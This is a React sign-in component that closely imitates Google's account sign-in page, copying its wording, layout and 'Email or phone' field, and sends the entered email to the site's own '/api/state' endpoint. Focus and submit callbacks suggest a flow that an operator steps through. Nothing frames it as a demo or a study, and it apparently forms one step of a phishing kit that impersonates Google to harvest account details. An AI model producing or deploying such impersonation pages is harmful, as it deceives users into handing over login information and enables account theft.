"use client";

import { useForm, type SubmitHandler } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";

const emailSchema = z.object({
  email: z.string().email({ message: "Please enter a valid email." }),
});
type EmailFormData = z.infer<typeof emailSchema>;

type EmailStepProps = {
  onInteractionStart: () => void;
  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
};

export default function EmailStep({ onInteractionStart, onInteractionEnd }: EmailStepProps) {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<EmailFormData>({
    resolver: zodResolver(emailSchema),
  });
  const { toast } = useToast();

  const onSubmit: SubmitHandler<EmailFormData> = async (data) => {
    await onInteractionEnd(async () => {
      try {
        const res = await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "submitEmail", email: data.email }),
        });
        if (!res.ok) throw new Error("Server responded with an error.");
      } catch (error) {
        toast({
          variant: "destructive",
          title: "Error",
          description: "Could not proceed. Please try again.",
        });
      }
    });
  };

  return (
    <div className="w-full">
      <h1 className="text-2xl font-normal">Sign in</h1>
      <p className="mt-2 text-sm">Use your Google Account</p>
      
      <form onSubmit={handleSubmit(onSubmit)} className="mt-8 space-y-6">
        <div className="relative">
          <Input
            id="email"
            type="email"
            placeholder="Email or phone"
            {...register("email")}
            className="h-14 pt-2 text-base"
            onFocus={onInteractionStart}
          />
          {errors.email && <p className="text-sm text-destructive mt-1 px-1">{errors.email.message}</p>}
        </div>

        <div className="text-left text-sm text-primary">
            <button type="button" className="font-semibold">Forgot email?</button>
        </div>

        <div className="text-left text-sm text-muted-foreground mt-8">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <a href="#" className="text-primary font-semibold">Learn more</a>
        </div>
        
        <div className="flex justify-between items-center pt-4">
          <Button variant="ghost" className="text-primary -ml-4">Create account</Button>
          <Button type="submit" disabled={isSubmitting}>
            {isSubmitting ? "Loading..." : "Next"}
          </Button>
        </div>
      </form>
    </div>
  );
}
